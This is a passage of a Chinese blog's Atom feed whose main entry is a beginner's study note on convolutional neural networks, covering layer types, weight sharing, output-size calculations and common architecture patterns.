    </summary>
    
    
      <category term="瞎捉摸的一些学习" scheme="http://ggb0n.cool/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="obfs4网桥搭建" scheme="http://ggb0n.cool/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/obfs4%E7%BD%91%E6%A1%A5%E6%90%AD%E5%BB%BA/"/>
    
    
      <category term="Linux" scheme="http://ggb0n.cool/tags/Linux/"/>
    
      <category term="Tor" scheme="http://ggb0n.cool/tags/Tor/"/>
    
      <category term="obfs4网桥" scheme="http://ggb0n.cool/tags/obfs4%E7%BD%91%E6%A1%A5/"/>
    
  </entry>
  
  <entry>
    <title>卷积神经网络CNN入门</title>
    <link href="http://ggb0n.cool/2020/04/09/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9CCNN%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <id>http://ggb0n.cool/2020/04/09/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9CCNN%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</id>
    <published>2020-04-08T16:16:23.000Z</published>
    <updated>2020-05-04T01:39:38.666Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要是记录一下对<code>卷积神经网络</code>（<code>CNN</code>）的学习，这是在机器学习，具体来说是深度学习中的第一步，认真学习、好好记录。</p><p>CNN曾经被<code>AlphaGo</code>的开发团队用于其开发，从而也一度引起业内人士的青睐，不过有些时候会出现对CNN的盲目崇拜，比如你面试的时候，对面可能会问：你做过机器学习吗？你为什么没有采用CNN算法呢？<a id="more"></a><br>这可能让人无法回答，其实CNN虽然相对于<code>深度神经网络</code>（<code>DNN</code>）更加简便，效能也很好，不过CNN只是用于图像处理，或者具有与图像处理要素相当的一些问题的处理中，就比如<code>AlphaGo</code>的下围棋，其实就相当于把棋盘当做了图像来进行处理，因此，如果你需要利用神经网络实现某些项目，一定要考虑好它具备与图像处理相当的要素没有。</p><p>这里提供一个比较好的学习视频，是<a href="https://www.bilibili.com/video/BV1hp411d7ij/?spm_id_from=333.788.videocard.0">李宏毅老师的教学视频</a>。好了，下面进入学习记录了。</p><h3 id="卷积神经网络概述"><a href="#卷积神经网络概述" class="headerlink" title="卷积神经网络概述"></a>卷积神经网络概述</h3><p>卷积神经网络，是深度学习算法应用最成功的领域之一，卷积神经网络包括一维卷积神经网络，二维卷积神经网络以及三维卷积神经网络。一维卷积神经网络主要用于<code>序列类</code>的数据处理，二维卷积神经网络常应用于<code>图像类文本</code>的识别，三维卷积神经网络主要应用于<code>医学图像</code>以及<code>视频类</code>数据识别。</p><p>其结构模型如下：<br><img src="http://ggb0n.cool/images/moxing1.png" alt=""></p><p>与常规神经网络不同，卷积神经网络的各层中的神经元是<code>3维</code>排列的：<code>宽度</code>、<code>高度</code>和<code>深度</code>。其中的宽度和高度是很好理解的，因为本身卷积就是一个二维模板，但是在卷积神经网络中的深度指的是<strong>激活数据体</strong>的第三个维度，而不是整个网络的深度，整个网络的深度指的是网络的层数。</p><h3 id="卷积神经网络层次"><a href="#卷积神经网络层次" class="headerlink" title="卷积神经网络层次"></a>卷积神经网络层次</h3><p>卷积神经网络主要由这几类层构成：<code>输入层</code>、<code>卷积层</code>，<code>ReLU层</code>、<code>池化（Pooling）层</code>(有时也称降采样、下采样层)和<code>全连接层</code>（全连接层和常规神经网络中的一样）。通过将这些层叠加起来，就可以构建一个完整的卷积神经网络，如下图：</p><p><img src="http://ggb0n.cool/images/moxing2.png" alt=""></p><p>各层的主要作用如下：</p><ul><li>输入层：用于数据的输入；</li><li>卷积层：使用卷积核进行特征提取和特征映射；</li><li>池化层：进行下采样，对特征图稀疏处理，减少数据运算量；</li><li>激励层：由于卷积也是一种线性运算，因此需要增加非线性映射；</li><li>全连接层：通常在CNN的尾部进行重新拟合，减少特征信息的损失。</li></ul><h4 id="输入层"><a href="#输入层" class="headerlink" title="输入层"></a>输入层</h4><p>该层除了输入数据，还会对数据进行一些预处理，包括：<code>去均值</code>、<code>归一化</code>、<code>PCA</code>、<code>白化</code></p><blockquote><p>PCA：是指通过抛弃携带信息量较少的维度，保留主要的特征信J自，来对数据进行降维处理，思路上是使用少数几个有代表性、互不相关的特征来代替原先的..k量的、存在一定相关性的特征，从而加速机器学习进程。PCA可用于特征提取，数据压缩，去噪声，降维等操作。</p></blockquote><blockquote><p>白化：目的是去掉数据之间的相关联度和令方差均一化，由于图像中相邻像素之间具有很强的相关性，所以用于训练时很多输入是冗余的。这时候去相关的操作就可以采用自化操作，从而使得：</p><ul><li>1、减少特征之间的相关性</li><li>2、特征具有相同的方差</li></ul></blockquote><h4 id="卷积层"><a href="#卷积层" class="headerlink" title="卷积层"></a>卷积层</h4><p>卷积层是构建卷积神经网络的<strong>核心层</strong>，因此该层也是学习的重点。它产生了网络中大部分的<strong>计算量</strong>，注意是计算量而不是参数量。</p><p><strong>卷积层的作用</strong></p><p>主要有三点：</p><ul><li><p>滤波器的作用或者说是卷积的作用</p><blockquote><p>卷积层的参数是有一些可学习的<code>滤波器</code>（<code>Filter</code>）集合构成的。每个滤波器在空间上（宽度和高度）都比较小，<strong>但是深度和输入数据一致</strong>。<br>直观地来说，网络会让滤波器学习到当它看到某些类型的视觉特征时就激活，具体的视觉特征可能是某些方位上的边界，或者在第一层上某些颜色的斑点，甚至可以是网络更高层上的蜂巢状、车轮状的图案。</p></blockquote></li><li><p>可以看做神经元的一个输出</p><blockquote><p>神经元只观察输入数据中的一小部分，并且和空间上左右两边的所有神经元共享参数（因为这些数字都是使用同一个滤波器得到的结果）。</p></blockquote></li><li><p>减少参数数量</p><blockquote><p>这个由于卷积具有“<code>权值共享</code>”这样的特性，可以降低参数数量，达到降低计算开销，防止由于参数过多而造成过拟合。</p></blockquote></li></ul><p><strong>感受野</strong></p><p>在处理图像这样的高维度输入时，让每个神经元都与前一层中的所有神经元进行全连接是不现实的。而是让每个神经元只与输入数据的一个局部区域连接，该连接的空间大小叫做神经元的<code>感受野（receptive field）</code>，它的尺寸是一个超参数（滤波器的空间尺寸）。注意：在深度方向上，这个连接的大小总是和输入的深度相等。</p><p><strong>神经元的空间排列</strong></p><p>感受野讲解了卷积层中每个神经元与<strong>输入数据体</strong>之间的连接方式，但是尚未讨论输出数据体中神经元的数量，以及它们的排列方式。3个超参数控制着输出数据体的尺寸：<code>深度</code>（<code>depth</code>），<code>步长</code>（<code>stride</code>）和<code>零填充</code>（<code>zero-padding</code>）：</p><ul><li>深度：一个超参数，和使用的滤波器的数量一致，而每个滤波器在输入数据中寻找一些不同的东西，即图像的某些特征。</li><li>步长：在滑动滤波器的时候，必须指定步长。当步长为1，滤波器每次移动1个像素；当步长为2，滤波器滑动时每次移动2个像素，依次类推。这个操作会让输出数据体在空间上变小。</li><li>零填充：有时候将输入数据体用<code>0</code>在边缘处进行填充是很方便的。零填充的尺寸是一个超参数。它具有一个良好性质，即可以控制输出数据体的空间尺寸（最常用的是用来保持输入数据体在空间上的尺寸，使得输入和输出的宽高都相等）。</li></ul><p>输出数据体在空间上的尺寸 <code>W2*H2*D2</code>可以通过输入数据体尺寸<code>W1*H1*D1</code>、卷积层中神经元的感受野尺寸<code>F</code>、步长<code>S</code>、滤波器数量<code>K</code>和零填充的数量<code>P</code>计算输出出来：</p><p><img src="http://ggb0n.cool/images/size.jpg" alt=""></p><p>注意这些空间排列的超参数之间是相互限制的。举例说来，当输入尺寸<code>W=10</code>，不使用零填充<code>P=0</code>，滤波器尺寸 <code>F=3</code>，此时步长<code>S=2</code>是行不通，因为<code>(W-F+2P)/S+1=(10-3+0)/2+1=4.5</code>，结果不是整数，这就是说神经元不能整齐对称地滑过输入数据体。<br>因此，这些超参数的设定就被认为是无效的，一个卷积神经网络库可能会报出一个错误，通过修改零填充值、修改输入数据体尺寸，或者其他什么措施来让设置合理。合理地设置网络的尺寸让所有的维度都能正常工作，是相当让人头痛的事，而使用零填充和遵守其他一些设计策略将会有效解决这个问题。</p><p><strong>权值共享</strong></p><p>在卷积层中<code>权值共享</code>是用来控制参数的数量。假如在一个卷积核中，每一个感受野采用的都是不同的权重值（卷积核的值不同），那么这样的网络中参数数量将是十分巨大的。</p><p>权值共享是基于这样的一个合理的假设：如果一个特征在计算某个空间位置<code>(x1,y1)(x1,y1)</code>的时候有用，那么它在计算另一个不同位置<code>(x2,y2)(x2,y2)</code>的时候也有用。基于这个假设，可以显著地减少参数数量。<br>换言之，就是将深度维度上一个单独的2维切片看做<code>深度切片</code>（<code>depth slice</code>），比如一个数据体尺寸为<code>[55x55x96]</code>的就有96个深度切片，每个尺寸为<code>[55x55]</code>，其中在每个深度切片上的结果都使用同样的权重和偏差获得的。<br>在这样的参数共享下，假如一个例子中的第一个卷积层有96个卷积核，那么就有96个不同的权重集了，一个权重集对应一个深度切片，如果卷积核的大小是<code>11x11</code>的，图像是RGB3通道的，那么就共有<code>96x11x11x3=34,848</code>个不同的权重，总共有<code>34,944</code>个参数（因为要+96个偏差），并且在每个深度切片中的<code>55x55</code>的结果使用的都是同样的参数。</p><p>在反向传播的时候，都要计算每个神经元对它的权重的梯度，但是需要把同一个深度切片上的所有神经元对权重的梯度累加，这样就得到了对共享权重的梯度。这样，每个切片只更新一个权重集。原理如下图：</p><p><img src="http://ggb0n.cool/images/CNN02.png" alt=""></p><p><img src="http://ggb0n.cool/images/CNN03.png" alt=""></p><p>如上两图所示，左侧的神经元是将每一个感受野展开为一列之后串联起来（就是展开排成一列，同一层神经元之间不连接）。右侧的<code>Deep1i</code>是深度为<code>1</code>的神经元的第<code>i</code>个，<code>Deep2i</code>是深度为<code>2</code>的神经元的第<code>i</code>个，同一个深度的神经元的权值都是相同的，黄色的都是相同的（上面4个与下面4个的参数相同），蓝色也都是相同的。</p><p>所以现在回过头来看上面说的卷积神经网络的反向传播公式对梯度进行累加求和也是基于这点考虑（同一深度的不同神经元共用一组参数，所以累加）；而每个切片只更新一个权重集的原因也是这样的，因为从图中可以看到，不同深度的神经元不会公用相同的权重，所以只能更新一个权重集。</p><blockquote><p>注意：如果在一个深度切片中的所有权重都使用同一个权重向量，那么卷积层的前向传播在每个深度切片中可以看做是在计算神经元权重和输入数据体的卷积（这就是“<code>卷积层</code>”名字由来）。这也是为什么总是将这些权重集合称为滤波器（或<code>卷积核</code>（<code>kernel</code>）），因为它们和输入进行了卷积。</p></blockquote><blockquote><p>注意：有时候参数共享假设可能没有意义，特别是当卷积神经网络的输入图像是一些明确的中心结构时候。这时候我们就应该期望在图片的不同位置学习到完全不同的特征（而一个卷积核滑动地与图像做卷积都是在学习相同的特征）。一个具体的例子就是输入图像是人脸，人脸一般都处于图片中心，而我们期望在不同的位置学习到不同的特征，比如眼睛特征或者头发特征可能（也应该）会在图片的不同位置被学习。在这个例子中，通常就放松参数共享的限制，将层称为局部连接层（<code>Locally-Connected Layer</code>）。</p></blockquote><p><strong>卷积层的超参数及选择</strong></p><p>由于参数共享，每个滤波器包含<code>F*F*D1</code>个权重，卷积层一共有<code>F*F*D1*K</code>个权重和<code>K</code>个偏移。在输出数据体中，第<code>d</code>个深度切片（空间尺寸是<code>W2*H2</code>），用第<code>d</code>个滤波器和输入数据进行有效卷积运算的结果（使用步长<code>S</code>），最后在加上第<code>d</code>个偏差。</p><p>对这些超参数，常见的设置是<code>F=3</code>，<code>S=1</code>，<code>P=1</code>，<code>F=3</code>，<code>S=1</code>，<code>P=1</code>。</p><p><strong>卷积层演示</strong></p><p>因为3D数据难以可视化，所以所有的数据（<code>输入数据体是蓝色</code>，<code>权重数据体是红色</code>，<code>输出数据体是绿色</code>）都采取将深度切片按照列的方式排列展现。输入数据体的尺寸是<code>W1=5</code>，<code>H1=5</code>，<code>D1=3</code>，<code>W1=5</code>，<code>H1=5</code>，<code>D1=3</code>，卷积层参数<code>K=2</code>，<code>F=3</code>，<code>S=2</code>，<code>P=1</code>，<code>K=2</code>，<code>F=3</code>，<code>S=2</code>，<code>P=1</code>。就是说，有<code>2</code>个滤波器，滤波器的尺寸是<code>3*33*3</code>，它们的步长是<code>2</code>。因此，输出数据体的空间尺寸是<code>(5−3+2)/2+1=3(5−3+2)/2+1=3</code>。注意输入数据体使用了零填充<code>P=1</code>，所以输入数据体外边缘一圈都是<code>0</code>。<br>下面的例子在绿色的输出激活数据上循环演示，展示了其中每个元素都是先通过蓝色的输入数据和红色的滤波器逐元素相乘，然后求其总和，最后加上偏差得来。<br><img src="http://ggb0n.cool/images/juanji.jpg" alt=""></p><p><strong>卷积操作形式</strong></p><p>卷积操作的形式比较多，这里主要介绍三点：<code>矩阵乘法实现卷积</code>、<code>1*1卷积</code>、<code>扩张卷积</code>。</p><ul><li>用矩阵乘法实现卷积</li></ul><blockquote><p>卷积运算本质上就是在滤波器和输入数据的局部区域间做点积。卷积层的常用实现方式就是利用这一点，将卷积层的前向传播变成一个巨大的矩阵乘法。</p><p>(1) 输入图像的局部区域被<code>im2coim2col</code>操作拉伸为列。比如输入是<code>[227x227x3]</code>，要与尺寸为<code>11x11x3</code>的滤波器以步长为<code>4</code>进行卷积，就依次取输入中的<code>[11x11x3]</code>数据块，然后将其拉伸为长度为<code>11x11x3=363</code>的列向量。重复进行这一过程，因为步长为<code>4</code> ，所以经过卷积后的宽和高均为<code>(227-11)/4+1=55</code>，共有<code>55x55=3,025</code>个神经元。因为每一个神经元实际上都是对应有<code>363</code>的列向量构成的感受野，即一共要从输入上取出<code>3025</code>个<code>363</code>维的列向量。所以经过<code>im2col</code>操作得到的输出矩阵的尺寸是<code>[363x3025]</code>，其中每列是拉伸的感受野。注意因为感受野之间有重叠，所以输入数据体中的数字在不同的列中可能有重复。</p><p>(2) 卷积层的权重也同样被拉伸成行。举例：如果有96个尺寸为<code>[11x11x3]</code>的滤波器，就生成一个矩阵，尺寸为<code>[96x363]</code>。</p><p>(3) 现在卷积的结果和进行一个大矩阵乘法<code>np.dot(Wrow,Xcol)np.dot(Wrow,Xcol)</code>是等价的了，能得到每个滤波器和每个感受野间的点积。在我们的例子中，这个操作的输出是<code>[96x3025]</code>，给出了每个滤波器在每个位置的点积输出。注意其中的<code>np.dotnp.dot</code>计算的是矩阵乘法而不是点积。</p><p>(4) 结果最后必须被重新变为合理的输出尺寸<code>[55x55x96]</code>。</p></blockquote><p>这个方法的缺点就是占用内存太多，因为在输入数据体中的某些值在<code>XcolXcol</code>中被复制了多次；优点在于矩阵乘法有非常多的高效底层实现方式。</p><ul><li>1*1卷积</li></ul><p>具有信号处理专业知识的人刚开始看见这个<code>1*1卷积</code>的时候可能会比较困惑，因为信号是<code>2</code>维的，所以<code>1*1卷积</code>就没有意义。但是，在卷积神经网络中不是这样，因为这里是对<code>3</code>个维度进行操作，滤波器和输入数据体的深度是一样的。比如，如果输入是<code>[32x32x3]</code>，那么<code>1*1卷积</code>就是在高效地进行<code>3</code>维<code>点积</code>（因为输入深度是3个通道）；另外的一种想法是将这种卷积的结果看作是全连接层的一种实现方式，后面讲到全连接层会提到。</p><ul><li>扩张卷积</li></ul><p>我们前面提到的滤波器都是连续的，但是，让滤波器中元素之间有间隙也是可以的，这就叫做扩张，如图：</p><p><img src="http://ggb0n.cool/images/kuozhang.jpg" alt=""></p><p>在某些设置中，扩张卷积与正常卷积结合起来非常有用，因为这可以在很少的层数内更快地汇集输入图片的大尺度特征。比如，如果上下重叠<code>2</code>个<code>3*3</code>的卷积层，那么第二个卷积层的神经元的感受野是输入数据体中<code>5*5</code>的区域（可以称这些神经元的有效感受野是5*5）。如果我们对卷积进行扩张，那么这个有效感受野就会迅速增长。</p><p>至此，对卷积层的学习告一段落，下一层是池化层。</p><h4 id="ReLU层"><a href="#ReLU层" class="headerlink" title="ReLU层"></a>ReLU层</h4><p>也称线性整流层（<code>Rectified Linear Units layer, ReLU layer</code>），使用<a href="https://zh.wikipedia.org/wiki/线性整流函数">线性整流函数</a>（<code>Rectified Linear Units, ReLU</code>）<code>f(x)=max(0,x)</code>作为这一层神经的激励函数（<code>Activation function</code>）。它可以增强判定函数和整个神经网络的非线性特性，而本身并不会改变卷积层。</p><p>事实上，其他的一些函数也可以用于增强网络的非线性特性，如<a href="https://zh.wikipedia.org/wiki/双曲正切函数">双曲正切函数</a> <code>f(x)=tanh(x)</code>、<code>f(x)=|tanh(x)|</code>，或者<a href="https://zh.wikipedia.org/wiki/S函数">Sigmoid函数</a><code>f(x)=(1+e^(-x))^(-1)</code>。相比其它函数来说，ReLU函数更受青睐，这是因为它可以将神经网络的训练速度提升数倍，而并不会对模型的泛化准确度造成显著影响。</p><h4 id="池化层"><a href="#池化层" class="headerlink" title="池化层"></a>池化层</h4><p>通常在连续的卷积层之间会周期性地插入一个<code>池化层</code>（<code>Pooling</code>），它的作用是逐渐降低数据体的空间尺寸，这样的话就能减少网络中参数的数量，使得计算资源耗费变少，也能有效控制过拟合。如下图：</p><p><img src="http://ggb0n.cool/images/pooling.png" alt=""></p><p>池化层使用<code>MAX</code>操作，对输入数据体的每一个深度切片独立进行操作，改变它的空间尺寸。最常见的形式是使用尺寸<code>2*2</code>的滤波器，以步长为<code>2</code>来对每个深度切片进行降采样，将其中<code>75%</code>的激活信息都丢掉。每个<code>MAX</code>操作是从<code>4</code>个数字中取最大值（也就是在深度切片中某个<code>2*2</code>的区域），深度保持不变。</p><p>池化层的计算：输入数据体尺寸<code>W1*H1*D1</code>，有两个超参数：空间大小<code>F</code>和步长<code>S</code>；输出数据体的尺寸<code>W2*H2*D2</code>，其中：</p><p><img src="http://ggb0n.cool/images/poolingcalc.jpg" alt=""></p><p>这里面与之前的卷积的尺寸计算的区别主要在于两点：首先在池化的过程中基本不会进行另补充；其次池化前后深度不变。</p><p><strong>普通池化（General Pooling）</strong>：除了常用的最大池化，池化单元还可以使用其他的函数，比如<code>平均池化</code>（<code>average pooling</code>）或<code>L-2范式池化</code>（<code>L2-norm pooling</code>）。平均池化历史上比较常用，但是现在已经很少使用了。因为实践证明，最大池化的效果比平均池化要好。</p><p><strong>反向传播</strong>：回顾一下反向传播的内容，其中<code>max(x,y)</code>函数的反向传播可以简单理解为将梯度只沿最大的数回传。因此，在向前传播经过汇聚层的时候，通常会把池中最大元素的索引记录下来（有时这个也叫作<code>道岔</code>（<code>switches</code>）），这样在反向传播的时候梯度的路由就很高效。</p><p><strong>不使用池化层</strong>：有些时候，被当做图像处理的问题其实也并不完全等同于图像处理，比如AlphaGo的下围棋：棋盘是不能摘除一部分位置进行缩小的，因此也就不能进行池化，事实上AlphaGo也并没有采用池化层。<br>通过在卷积层中使用更大的步长来降低数据体的尺寸。有发现认为有时候，在训练一个良好的生成模型时，弃用汇聚层也是很重要的。比如<code>变化自编码器</code>（<code>VAEs：variational autoencoders</code>）和<code>生成性对抗网络</code>（<code>GANs：generative adversarial networks</code>）。未来的卷积网络结构中，池化层的发展还真不能确定。</p><h4 id="全连接层"><a href="#全连接层" class="headerlink" title="全连接层"></a>全连接层</h4><p>全连接层（简称<code>FC</code>）将每一个结点都与上一层的所有结点相连，用来把前边提取到的特征综合起来。全连接层可以整合卷积层或者池化层中具有类别区分性的局部信息。</p><p>为了提升 CNN 网络性能，全连接层每个神经元的激励函数一般采用ReLU函数。最后一层全连接层的输出值被传递给一个输出，可以采用<code>softmax</code>逻辑回归（<code>softmax regression</code>）进行分类，该层也可称为<code>softmax</code>层（<code>softmax laye</code>）。</p><p><strong>将卷积层转化为全连接层</strong></p><p>对于任一个卷积层，都存在一个能实现和它一样的前向传播函数的全连接层。该全连接层的权重是一个巨大的矩阵，除了某些特定块（感受野），其余部分都是<code>0</code>；而在非<code>0</code>部分中，大部分元素都是相等的（权值共享）。<br>如果把全连接层转化成卷积层，以输出层的<code>Deep11</code>为例，与它有关的输入神经元只有上面四个，所以在权重矩阵中与它相乘的元素，除了它所对应的<code>4</code>个，剩下的均为<code>0</code>，这也就解释了为什么权重矩阵中有为零的部分。<br>另外要把“<code>将全连接层转化成卷积层</code>”和“<code>用矩阵乘法实现卷积</code>”区别开，这两者是不同的，后者本身还是在计算卷积，只不过将其展开为矩阵相乘的形式，并不是”将全连接层转化成卷积层”，所以除非权重中本身有零，否则用矩阵乘法实现卷积的过程中不会出现值为<code>0</code>的权重。</p><p><strong>将全连接层转化为卷积层</strong></p><p>任何全连接层都可以被转化为卷积层。比如，一个<code>K=409</code>6的全连接层，输入数据体的尺寸是 <code>7*7*5127*7*512</code>，这个全连接层可以被等效地看做一个<code>F=7</code>，<code>P=0</code>，<code>S=1</code>，<code>K=4096</code>，<code>F=7</code>，<code>P=0</code>，<code>S=1</code>，<code>K=4096</code>的卷积层。换句话说，就是将滤波器的尺寸设置为和输入数据体的尺寸设为一致的。因为只有一个单独的深度列覆盖并滑过输入数据体，所以输出将变成<code>1*1*40961*1*4096</code>，这个结果就和使用初始的那个全连接层一样了。<br>这个实际上也很好理解，因为，对于其中的一个卷积滤波器，这个滤波器的的深度为<code>512</code>，也就是说，虽然这个卷积滤波器的输出只有<code>1</code>个，但是它的权重有<code>7*7*5127*7*512</code>，相当于卷积滤波器的输出为一个神经元，这个神经元与上一层的所有神经元相连接，而这样与前一层所有神经元相连接的神经元一共有<code>4096</code>个，这不就是一个全连接网络。</p><p>在上述的两种变换中，<code>将全连接层转化为卷积层</code>在实际运用中更加有用。假设一个卷积神经网络的输入是<code>224*224*3</code>的图像，一系列的卷积层和汇聚层将图像数据变为尺寸为<code>7*7*512</code>的激活数据体（在AlexNet中就是这样，通过使用5个汇聚层来对输入数据进行空间上的降采样，每次尺寸下降一半，所以最终空间尺寸为<em>224/2/2/2/2/2=7</em>）。从这里可以看到，AlexNet使用了两个尺寸为<code>4096</code>的全连接层，最后一个有<code>1000</code>个神经元的全连接层用于计算分类评分。我们可以将这3个全连接转化为3个卷积层：</p><blockquote><p>(1) 针对第一个连接区域是<code>[7x7x512]</code>的全连接层，令其滤波器尺寸为<code>F=7</code>，这样输出数据体就为<code>[1x1x4096]</code>了。</p><p>(2) 针对第二个全连接层，令其滤波器尺寸为<code>F=1</code>，这样输出数据体为<code>[1x1x4096]</code>。</p><p>(3) 对最后一个全连接层也做类似的，令其<code>F=1</code>，最终输出为<code>[1x1x1000]</code>。</p></blockquote><p>这样做的目的是让卷积网络在一张更大的输入图片上滑动，得到多个输出，这样的转化可以让我们在单个向前传播的过程中完成上述的操作。</p><p>至此，对CNN各层的学习暂时告一段落，最起码有了一定的了解。下面将对各层之间的结构进行学习。</p><h3 id="卷积神经网络结构特点"><a href="#卷积神经网络结构特点" class="headerlink" title="卷积神经网络结构特点"></a>卷积神经网络结构特点</h3><p>卷积神经网络通常是由三种层构成：卷积层，池化层（除非特别说明，一般就是最大值池化）和全连接层。ReLU层通常在卷积层之后，它逐元素地进行激活函数操作，常常将它与卷积层看作是同一层。</p><h4 id="层的排列规律"><a href="#层的排列规律" class="headerlink" title="层的排列规律"></a>层的排列规律</h4><p>卷积神经网络最常见的形式就是将一些卷积层和ReLU层放在一起，其后紧跟池化层，然后重复如此直到图像在空间上被缩小到一个足够小的尺寸，在某个地方过渡成成全连接层也较为常见。最后的全连接层得到输出，比如分类评分等。换句话说，最常见的卷积神经网络结构如下：</p><p><img src="http://ggb0n.cool/images/pailie.jpg" alt=""></p><p>其中<code>*</code>指的是重复次数，<code>POOL?</code>指的是一个可选的池化层。其中<code>N&gt;=0</code>,通常<code>N&lt;=3</code>，<code>M&gt;=0</code>，<code>K&gt;=0</code>，<code>K&lt;3</code>。例如，下面是一些常见的网络结构规律：</p><ul><li><strong>INPUT -&gt; FC</strong> ：实现一个线性分类器，此处<code>N = M = K = 0</code>；</li><li><strong>INPUT -&gt; CONV -&gt; RELU -&gt; FC</strong>：单层的卷积神经网络；</li><li><strong>INPUT -&gt; [CONV -&gt; RELU -&gt; POOL]*2 -&gt; FC -&gt; RELU -&gt; FC</strong>：此处在每个汇聚层之间有一个卷积层，这种网络就是简单的多层的卷积神经网络；</li><li><strong>INPUT -&gt; [CONV -&gt; RELU -&gt; CONV -&gt; RELU -&gt; POOL]*3 -&gt; [FC -&gt; RELU]*2 -&gt; FC</strong>：此处每个汇聚层前有两个卷积层，这个思路适用于更大更深的网络，因为在执行具有破坏性的汇聚操作前，多重的卷积层可以从输入数据中学习到更多的复杂特征。</li></ul><h4 id="卷积层的大小选择"><a href="#卷积层的大小选择" class="headerlink" title="卷积层的大小选择"></a>卷积层的大小选择</h4><p><strong>几个小滤波器卷积层的组合比一个大滤波器卷积层好</strong>。假设你一层一层地重叠了<code>3</code>个<code>3*3</code>的卷积层（层与层之间有ReLU激活函数）。在这个排列下，第一个卷积层中的每个神经元都对输入数据体有一个<code>3*3</code>的视野。第二个卷积层上的神经元对第一个卷积层有一个<code>3*3</code>的视野，也就是对输入数据体有<code>5*5</code>的视野。同样，在第三个卷积层上的神经元对第二个卷积层有<code>3*3</code>的视野，也就是对输入数据体有<code>7*7</code>的视野。</p><p>假设不采用这<code>3</code>个<code>3*3</code>的卷积层，而是使用一个单独的有<code>7*7</code>的感受野的卷积层，那么所有神经元的感受野也是<code>7*7</code>。多个卷积层与非线性的激活层交替的结构，比单一卷积层的结构更能提取出深层的更好的特征。但是也会有一些缺点，假设所有的数据有<code>C</code>个通道，那么单独的<code>7*7</code>卷积层将会包含<code>C*(7*7*C)=49C^2</code>个参数，而<code>3</code>个<code>3*3</code>的卷积层的组合仅有<code>3*(C*(3*3*C))=27C^2</code>个参数</p><p>直观说来，最好选择带有小滤波器的卷积层组合，而不是用一个带有大的滤波器的卷积层。前者可以表达出输入数据中更多个强力特征，使用的参数也更少。唯一的不足是，在进行反向传播时，中间的卷积层可能会导致占用更多的内存。</p><h4 id="层的尺寸设置"><a href="#层的尺寸设置" class="headerlink" title="层的尺寸设置"></a>层的尺寸设置</h4><p>各层常见的尺寸设置如下：</p><ul><li><strong>输入层</strong>：应该能被<code>2</code>整除很多次。常用数字包括<code>32</code>，<code>64</code>，<code>96</code>或<code>224</code>（比如ImageNet卷积神经网络），<code>384</code>和<code>512</code>。</li><li><strong>卷积层</strong>：应该使用小尺寸滤波器（比如<code>3*3</code>或最多<code>5*5</code>），使用步长<code>S=1</code>。还有一点非常重要，就是对输入数据进行<code>零填充</code>，这样卷积层就不会改变输入数据在空间维度上的尺寸。比如，当<code>F=3</code>，那就使用<code>P=1</code>来保持输入尺寸。当<code>F=5</code>，<code>P=2</code>，一般对于任意<code>F</code>，当<code>P=(F-1)/2</code>的时候能保持输入尺寸。如果必须使用更大的滤波器尺寸（比如<code>7*7</code>之类），通常只用在第一个面对原始图像的卷积层上。</li><li><strong>池化层</strong>：负责对输入数据的空间维度进行降采样。最常用的设置是用<code>2*2</code>感受野（即<code>F=2</code>）的最大值池化，步长为<code>S=2</code>。注意这一操作将会把输入数据中<code>75%</code>的激活数据丢弃（因为对宽度和高度都进行了<code>2</code>的下采样）。<br>另一个不那么常用的设置是使用<code>3*3</code>的感受野，步长为<code>2</code>。最大值池化的感受野尺寸很少有超过<code>3</code>的，因为池化操作过度，易造成数据信息丢失，这通常会导致算法性能变差。</li></ul><p>至此，对卷积神经网络的学习到此告一段落，很多深层次的地方其实还没搞懂，在以后的实践中再加深学习吧。</p><p>参考：<br><a href="https://zhuanlan.zhihu.com/p/37261854">卷积神经网络入门详解</a><br><a href="https://www.bilibili.com/video/BV1hp411d7ij/?spm_id_from=333.788.videocard.0">李宏毅机器学习教学视频</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文主要是记录一下对&lt;code&gt;卷积神经网络&lt;/code&gt;（&lt;code&gt;CNN&lt;/code&gt;）的学习，这是在机器学习，具体来说是深度学习中的第一步，认真学习、好好记录。&lt;/p&gt;
&lt;p&gt;CNN曾经被&lt;code&gt;AlphaGo&lt;/code&gt;的开发团队用于其开发，从而也一度引起业内人士的青睐，不过有些时候会出现对CNN的盲目崇拜，比如你面试的时候，对面可能会问：你做过机器学习吗？你为什么没有采用CNN算法呢？
    
    </summary>
    
    
      <category term="机器学习" scheme="http://ggb0n.cool/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Machine Learning" scheme="http://ggb0n.cool/tags/Machine-Learning/"/>
    
      <category term="Neural Network" scheme="http://ggb0n.cool/tags/Neural-Network/"/>
    
  </entry>
  
  <entry>
    <title>机器学习基本知识</title>
    <link href="http://ggb0n.cool/2020/04/09/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/"/>
    <id>http://ggb0n.cool/2020/04/09/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/</id>
    <published>2020-04-08T16:03:30.000Z</published>
    <updated>2020-04-22T00:16:45.002Z</updated>
    
